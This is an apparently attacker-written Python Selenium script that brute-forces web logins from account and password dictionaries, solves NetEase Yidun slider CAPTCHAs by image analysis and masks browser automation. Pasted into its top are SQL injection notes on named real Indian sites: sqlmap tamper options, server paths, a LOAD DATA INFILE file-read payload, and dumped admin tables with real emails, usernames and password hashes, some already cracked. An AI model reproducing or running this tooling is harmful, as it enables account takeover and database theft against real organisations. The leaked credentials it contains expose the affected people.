import random
from selenium.webdriver import ActionChains
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from PIL import Image
import numpy as np
from scipy import signal
import requests
import time
import matplotlib.pylab as plt
import base64
import calendar
import argparse
from imutils import paths
import os
from PIL import Image
from PIL import ImageChops
import shutil
import hashlib
import optparse
import pyautogui

background_path = 'background.png'
slider_path = 'slider.png'
offset=-8



 --tamper=between,randomcase,space2comment
select @@datadir
select @@Database


nielitagtadmission.in

select @@datadir: '/opt/lampp/var/mysql/'


============================
https://ocat.in/

 d:\RcOnlineDemo\www\App_Code

============================

dbkncollege.co.in
c:\HostingSpaces\admin\dbkncollege.co.in\wwwroot\App_Code

============================
gcwhisar.ac.in
C:\inetpub\wwwroot\CollegeWebsite\App\


https://remotexs.in
/var/www/eclat_ws/sites/all/modules/contrib/
============================



https://srws.in/info.php


============================
https://indiacements.co.in/info.php

https://indiacements.co.in/admin/login.php
https://indiacements.co.in/phpMyAdmin/index.php

C:\\inetpub\\wwwroot\\indiacements\\images
C:\inetpub\wwwroot\indiacements\images
C:\\inetpub\\temp\\apppools\\indiacements.co.in\\

C:\\ProgramData\\MySQL\\MySQL Server 5.5\\Data\\'

LOAD DATA INFILE 'C:\\inetpub\\wwwroot\\indiacements\\index.php' INTO TABLE testfile FIELDS TERMINATED BY 'fuck' (filein)

Database: icl_demo
Table: m_adminusers
[2 entries]
+---------+--------------------+-------+---------+--------+---------------------+----------+------------------------------------------+--------------------+-----------+---------------------------------------------------+---------------------+-------------+
| adminid | email              | fname | lname   | logged | created             | status   | password                                 | username           | admintype | adminimage                                        | last_login          | logout_time |
+---------+--------------------+-------+---------+--------+---------------------+----------+------------------------------------------+--------------------+-----------+---------------------------------------------------+---------------------+-------------+
| 1       | coromandel@icl.com | Admin | <blank> | 0      | 2023-08-31 21:02:31 | 1        | f78ea0aa6c5f54caee31368283cdd62f         | coromandel@icl.com | 1         | 14526615943AbstractDancingIcon-e1284976045401.jpg | 2023-08-31 21:02:31 | 8388607     |
| 79      | admin              | admin | P M     | 0      | 2016-11-28 18:04:31 | 2        | 21232f297a57a5a743894a0e4a801fc3 (admin) | admin              | 1         | 147409634111cxI9s9-1280x800.jpg                   | 2016-11-28 17:58:20 | 0           |
+---------+--------------------+-------+---------+--------+---------------------+----------+------------------------------------------+--------------------+-----------+---------------------------------------------------+---------------------+-------------+

[16:29:13] [INFO] table 'icl_demo.m_adminusers' dumped to CSV file '/root/.local/share/sqlmap/output/indiacements.co.in/dump/icl_demo/m_adminusers.csv'
[16:29:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/indiacements.co.in'


Database: iclsugar
Table: dbs_adminusers
[2 entries]
+---------+------------------------------+---------------+--------+------------------+----------+------------------------------------------+-----------------+-----------+-------------+
| adminid | email                        | name          | logged | created          | status   | password                                 | username        | admintype | logout_time |
+---------+------------------------------+---------------+--------+------------------+----------+------------------------------------------+-----------------+-----------+-------------+
| 1       | thulasiram.pixel@gmail.com   | Administrator | 0      | 2011-12-30 12:24 | 1        | f78ea0aa6c5f54caee31368283cdd62f         | coromandeladmin | 1         | 1660649312  |
| 31      | websupport@pixel-studios.com | Pixel Admin   | 1      | 2016-12-16 11:10 | 1        | 827ccb0eea8a706c4c34a16891f84e7b (12345) | pixeladmin      | 1         | 1519970600  |
+---------+------------------------------+---------------+--------+------------------+----------+------------------------------------------+-----------------+-----------+-------------+

[16:38:29] [INFO] table 'iclsugar.dbs_adminusers' dumped to CSV file '/root/.local/share/sqlmap/output/indiacements.co.in/dump/iclsugar/dbs_adminusers.csv'
[16:38:29] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/indiacements.co.in'


https://nielitagtadmission.in




https://gfcollege.in
Database: gfcollege
Table: login
[2 entries]
+----------+---------------+----------------------------------+-----------+------------+
| login_id | department_id | password                         | user_name | login_type |
+----------+---------------+----------------------------------+-----------+------------+
| 1        | 0             | d2f33345ab3e7d9e54e3fbe327b28b6d | admin     | 1          |
| 29       | 16            | f535e0914128c4a405909a0caefba0db | MROBOT    | 2          |
+----------+---------------+----------------------------------+-----------+------------+

[16:57:57] [INFO] table 'gfcollege.login' dumped to CSV file '/root/.local/share/sqlmap/output/gfcollege.in/dump/gfcollege/login.csv'
[16:57:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/gfcollege.in'

[16:59:40] [INFO] fetching SQL SELECT statement query output: 'select @@datadir'
select @@datadir: '/var/lib/mysql_data/6/'






def valid_test_img_show(img, distance):
    plt.figure
    plt.imshow(img)
    plt.axvline(distance, color="r")
    plt.savefig("imgs/valid.png")
    # plt.show()


def get_boundary(array):
    grad = np.array(array > 0)
    h, w = grad.shape
    # img_show(grad)
    rows_sum = np.sum(grad, axis=1)
    cols_sum = np.sum(grad, axis=0)
    left, top, bottom = 0, 0, h
    # get the top index
    p = np.max(rows_sum) * 0.5
    for i in range(h):
        if rows_sum[i] > p:
            top = i
            break
    for i in range(h - 1, -1, -1):
        if rows_sum[i] > p:
            bottom = i
            break
    p = np.max(cols_sum) * 0.5
    for i in range(w):
        if cols_sum[i] > p:
            left = i
            break
    return top, bottom + 1, left


def get_tracks(distance):
    v = random.randint(0, 2)
    t = 0.1
    tracks = []
    cur = 0
    mid = distance * 0.8
    while cur < distance:
        if cur < mid:
            a = random.randint(2, 4)
        else:
            a = -random.randint(3, 5)
        s = v * t + 0.5 * a * t ** 2
        cur += s
        v = v + a * t
        tracks.append(round(s))
    tracks.append(distance - sum(tracks))
    return tracks





def download_img(driver, selenium_item,path, size):

    url = selenium_item.get_attribute("src")
    
    if url is not None:
        response = requests.get(url)
        with open(path, "wb") as f:
            f.write(response.content)
        img = Image.open(path).resize(size)
      
        img.save(path)
        img.close()
    # use js to download picture
    else:
        class_name = selenium_item.get_attribute("class")
        # 下面的js代码根据canvas文档说明而来
        js_cmd = (
            'return document.getElementsByClassName("%s")[0].toDataURL("image/png");'
            % class_name
        )
        # 执行 JS 代码并拿到图片 base64 数据
        im_info = driver.execute_script(js_cmd)  # 执行js文件得到带图片信息的图片数据
        im_base64 = im_info.split(",")[1]  # 拿到base64编码的图片信息
        im_bytes = base64.b64decode(im_base64)  # 转为bytes类型
        with open(path, "wb") as f:  # 保存图片到本地
            f.write(im_bytes)
        img = Image.open(path).resize(size)
       
        img.save(path)
        img.close()
    


def download_images(driver,background_item,slider_item,rtime):

    # backgroud_size = (
    #     background_item.size["width"], background_item.size["height"]
    # )
    #slider_size = slider_item.size["width"], slider_item.size["height"]
    slider_size = 61, 160
    backgroud_size = (
        320, 160
    )

    download_img(driver,background_item, background_path, backgroud_size)
    download_img(driver,slider_item, 'imgs/'+rtime+'_'+slider_path, slider_size)
  

def is_image_file(self,filename):
    return any(filename.endswith(extension) for extension in ['.png', '.jpg', '.jpeg', '.PNG', '.JPG', '.JPEG'])




def imageCompare(imagePath):

    dataset_dir='./imgs/'
    # 使用imutils.paths模块中的list_images()方法可以获取当前目录下的图片路径
    imagePaths=sorted(list(paths.list_images(dataset_dir)))
    with open(imagePath, 'rb') as fp1:
            data1 = fp1.read()
    file_md51= hashlib.md5(data1).hexdigest()
  
    for image_filename in imagePaths:

        if imagePath not in  image_filename:

            with open(image_filename, 'rb') as fp2:

                data2 = fp2.read()
            file_md52= hashlib.md5(data2).hexdigest()
  
            #print('--'+file_md51+'=='+file_md52+'--')
      
            if file_md51==file_md52:
                print('返回相同距离的图片.....')
                return image_filename
    return "F"


def get_distance_by_default(rtime,offset,background_item,slider_item):

    download_images(driver,background_item,slider_item,rtime)
    res=imageCompare('imgs/'+rtime+'_'+slider_path)
    print('图片:'+res)
    if res!='F':

        f = open("distince_data.dic")
        lines = f.readlines()
        for line in lines:
            
            dis=line.replace('\n','').split('|')
          
            if  dis[0] in (res):
                print('---distince:'+dis[1])
                return int(dis[1])
    
    backgroud_img = Image.open(background_path).convert("L")
    slider_img = Image.open('imgs/'+rtime+'_'+slider_path).convert("L")
    backgroud_img = np.array(backgroud_img)
    slider_img = np.array(slider_img)

    top, bottom, left = get_boundary(slider_img)
    scharr = np.array([[-6, 0, +6], [-6, 0, +6], [-6, 0, +6]])
    grad = signal.correlate2d(
        backgroud_img[top:bottom, :], scharr, boundary="symm", mode="same"
    )
    # 得到距离
    cols_sum = np.sum(grad, axis=0)
    # desc
    sorted_sum = np.argsort(-np.abs(cols_sum))
    distance = np.min(sorted_sum[:4])

    return distance + offset - left+50


def runData(driver,account,passwd,icount):
    #rs=crack_slider(driver,account,passwd)
    print('icount:'+str(icount))
    try:
        driver.delete_all_cookies()
        driver.refresh()
        time.sleep(2)
    
        start_but = driver.find_element(By.XPATH,'//*[@id="root"]/div[1]/div/div[1]/img[3]')
        start_but.click()
        time.sleep(2)
        username = driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/input[1]')
        username.clear()
        username.send_keys(account)  # 填入用户名 
        password = driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/input[2]')
        if icount==4:
            password.clear()
            passwd=account.capitalize()
          
            password.send_keys(passwd)  # 填入密码
        else:
            password.clear()
            passwd=passwd.capitalize()
         
            password.send_keys(passwd)  # 填入密码
        print("当前第"+str(userCount)+"条数据,"+account+"|"+passwd)
        submit = driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/span')
        submit.click()


    except Exception as e:

        runData(driver,account,passwd,icount)
    

def run(driver,account,passwd,icount,func):

    time.sleep(3)
    resr=''
    try:
        wait = WebDriverWait(driver, 5)
        if func=='A':
            try:
            
                background_item = wait.until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_bg-img"))
                )
                slider_item = wait.until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_jigsaw"))
                )

                fore = random.randint(10, 18)
                distance=0
                ts=calendar.timegm(time.gmtime())
                distance = get_distance_by_default(str(ts),offset,background_item,slider_item)
                resr=str(ts)+'_'+slider_path+'|'+str(distance)
                
                time.sleep(2)
            except Exception as e:
                
                return "F"
        
   
            try:
                tracks = get_tracks(distance + fore)
                bing_handle = None
                
                parent_element = driver.find_element(By.CSS_SELECTOR, ".yidun_control")
                slider_btn = parent_element.find_element(By.CSS_SELECTOR,'.yidun_slider__icon')
            
                ActionChains(driver).click_and_hold(slider_btn).perform()
        
                time.sleep(random.randint(0, 5) * 0.1)
            
        
        
                for t in tracks:
                    ActionChains(driver,duration=1).move_by_offset(t, 0).perform()
    
                time.sleep(random.randint(0, 5) * 0.1)
                for t in range(1,3):
                
                    ActionChains(driver,duration=5).move_by_offset(-21.5, 20).perform()
                    time.sleep(random.randint(0, 5) * 0.1)
        
                slider_btn = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "[class='yidun_slider__icon']")))
                #ActionChains(driver).click(slider_btn)
                time.sleep(2)
                #pyautogui.mouseUp(x=0, y=0, button='left')
        
                ActionChains(driver).release(slider_btn).perform()

           
            except Exception as e:
                pass
        time.sleep(3)
        try:
            handlers = driver.window_handles
            for winHandler in handlers:
                driver.switch_to.default_content()            
            time.sleep(3)
            res=''
            
            if driver.find_element(By.XPATH,'//*[@id="body_container"]/div[*]/div/div/p[1]/img')!='':
 
                res=driver.find_element(By.CLASS_NAME,'msg__5sckD').get_attribute('textContent')
                driver.find_element(By.XPATH,'//*[@id="body_container"]/div[*]/div/div/p[1]/img').click()
                time.sleep(2)
             
                if resr!='':
                    print('存储拖动距离.....')
                    print(resr)
                    with open("distince_data.dic", "a") as f1:  # 保存图片到本地
                        f1.write(resr+'\n')
                    f1.close()
                str1=res.strip()
                print("响应内容：")
                print(str1)
      
            '''#用户名或密码错误
            #用户名或密码错误，5次后账号将进入保护期!'''
            print('----返回---')
            if str1.find(u"护期")>0:
                return "O"
            if str1.find(u"过多")>0:
                return "F"
            if str1.find(u"用户名")>0:
                return "F"
           
        except Exception as e:
            handlers = driver.window_handles
            for winHandler in handlers:
                driver.switch_to.default_content()            
            time.sleep(3)
            res=''
          
            element = wait.until(
                EC.presence_of_element_located((By.XPATH,'//*[@id="root"]/div[1]/div'))
            )

            if  element.get_attribute('innerText')!='':
                with open("account.dic", "a") as f: 
                    f.write(account+'|'+passwd+'\n')
                f.close()
                print('存储拖动距离.....')
                print(resr)
                with open("distince_data.dic", "a") as f1:  # 保存图片到本地
                    f1.write(resr+'\n')
                f1.close()
                driver.find_element(By.XPATH,'//*[@id="root"]/div[1]/div/div[1]').click()
                time.sleep(3)
                
                handlers = driver.window_handles
                for winHandler in handlers:
                    driver.switch_to.default_content() 
                time.sleep(3)     
                driver.find_element(By.XPATH,'//*[@id="root"]/div[2]/div/div[2]/a[2]').click()
                time.sleep(3) 
      
                # handles = driver.window_handles
                # print(handles)
                handles = driver.window_handles
              
                bing_handle = None
                for handle in handles:
                    bing_handle = handle

                driver.switch_to.window(bing_handle)

                driver.find_element(By.XPATH,'//*[@id="body_container"]/div[5]/div/div/div/div/span[2]').click()
                time.sleep(3) 
                return "T"
        return "F"
    except Exception as e:
        if driver.find_element(By.CSS_SELECTOR, "[class='yidun_tips__text yidun-fallback__tip']")!='':
            res=driver.find_element(By.CSS_SELECTOR, "[class='yidun_tips__text yidun-fallback__tip']").get_attribute('textContent')
        
            print(res)
            if '失败过多' in res:
                driver.find_element(By.CSS_SELECTOR, "[class='yidun_tips__text yidun-fallback__tip']").click()
        print('')
        run(driver,account,passwd,icount,func)
        
           

   

if __name__ == "__main__":
    parser = optparse.OptionParser('python %prog ' +'-h (manual)',version='%prog v1.0')
    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

    parser.add_option('-a', dest='accountFile', type ='string', help='accountFile for account')
    parser.add_option('-s', dest='startLine',default=1, type='int', help='start Line')
    parser.add_option('-d', dest='dataFile', type='string', help='dataFile  for password')
    parser.add_option('-f', dest='func', type='string', help='func of run,auto or manual')
    (options, args) = parser.parse_args()
    
    
    TEST_URL = options.tgtUrl
    
    accountFile = options.accountFile
    startLine = options.startLine
    dataFile = options.dataFile
    func = options.func

    options = webdriver.ChromeOptions()
    #options.add_argument("start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option('excludeSwitches', ['enable-automation'])
    options.add_experimental_option('useAutomationExtension', False)

    driver = webdriver.Chrome(
        options=options
    )
    

    driver.get(TEST_URL)
    time.sleep(1)
   
    count=1
    global countLines
    readlines = len(open(accountFile,'r').readlines())
    accounts = open(accountFile)
  
    userCount=0

    for account in accounts:
        if startLine==count or startLine<count:
            
            #passwds = open('d:\dict.txt')
            passwds = open(dataFile)
            userCount=userCount+1
            icount=1
            
            for passwd in passwds:
                account = account.strip()
                passwd = passwd.strip()
                

                runData(driver,account,passwd,icount)

                #runData(driver)
                result=run(driver,account,passwd,icount,func)
                
                icount=icount+1
                print(result)
                if result=='T':
                    print('获取到数据：'+account+'|'+passwd+'\n')
                    break
                if result=='F' or result==None:
                    break
                if result=='O':
                    if 'https://' in TEST_URL:
                        sfile=TEST_URL.replace('https://','')
                    elif 'http://' in TEST_URL:
                        sfile=TEST_URL.replace('http://','')
                    else:
                        sfile=TEST_URL
                    if '/' in sfile:
                        sfile=sfile.replace('/','')
                    with open(sfile, "a") as f: 
                        f.write(account+'\n')
                    f.close()
        count=count+1

    driver.close()
